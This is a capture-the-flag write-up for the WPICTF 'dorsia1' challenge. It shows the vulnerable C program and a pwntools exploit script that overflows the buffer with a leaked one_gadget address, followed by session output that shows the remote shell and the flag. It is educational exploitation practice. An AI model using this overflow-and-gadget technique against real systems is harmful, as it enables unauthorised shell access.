We are provided a gif that has code in it.  

```
#include <stdio.h>
#include <stdlib.h>
void main()
{
        char a[69];
        printf("%p\n", system+765772);
        fgets(a,96,stdin);
}
```

Overflow at 69, return address at 77 (69+8)  
After running it once, the printf shows us that the server has it running as a 64bit elf.

It turns out that the value sent over by the printf is a magic gadget, confirmed with one_gadget.  We can just overflow and fill the return with that address to get the shell.

```
from pwn import *

r = remote("dorsia1.wpictf.xyz",31337)
#r = process("./program", env = {'LD_PRELOAD':'./libc.so.6'})
#gdb.attach(r, '''break fgets''')

output = r.recvline()
magic = int(output.rstrip(), 16)

print("received address: " + output)
print("sending payload")

r.sendline('A'*(77) + p64(magic))
r.interactive()
```

Running that script:
```
python exploit.py 
[+] Opening connection to dorsia1.wpictf.xyz on port 31337: Done
system at: 0x7b4cb1bd8440
received address: 0x7b4cb1c9338c
sending payload
[*] Switching to interactive mode
$ pwd
/home/ctf

$ ls
flag.txt
nanobuf
run_problem.sh

$ cat flag.txt
WPI{FEED_ME_A_STRAY_CAT}
```
